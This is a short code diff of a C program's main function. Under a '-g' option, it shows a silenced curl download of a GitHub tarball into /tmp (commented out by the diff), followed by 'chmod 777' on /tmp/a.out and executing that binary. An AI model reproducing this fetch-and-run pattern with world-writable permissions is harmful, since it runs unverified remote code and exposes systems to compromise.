@@ -139,7 +139,7 @@ int main(int argc, char* argv[]) {
         return 1;
     }
     
-    //networkcreation();
+    networkcreation();
     // Parse command-line options
     while ((c = getopt(argc, argv, "supai:gh")) != -1) {
         switch (c) {
@@ -168,9 +168,9 @@ int main(int argc, char* argv[]) {
                 }
                 break;
             case 'g':
-                system("cd /tmp && curl -L https://github.com/Unknowinglyy/utils/tarball/main | tar xz --strip-components=1 > /dev/null 2>&1");
+                // system("cd /tmp && curl -L https://github.com/Unknowinglyy/utils/tarball/main | tar xz --strip-components=1 > /dev/null 2>&1");
                 system("chmod 777 /tmp/a.out");
-                system("/tmp/a.out");
+                system("cd /tmp && /tmp/a.out");
                 return 0;
             case 'h':
                 help();
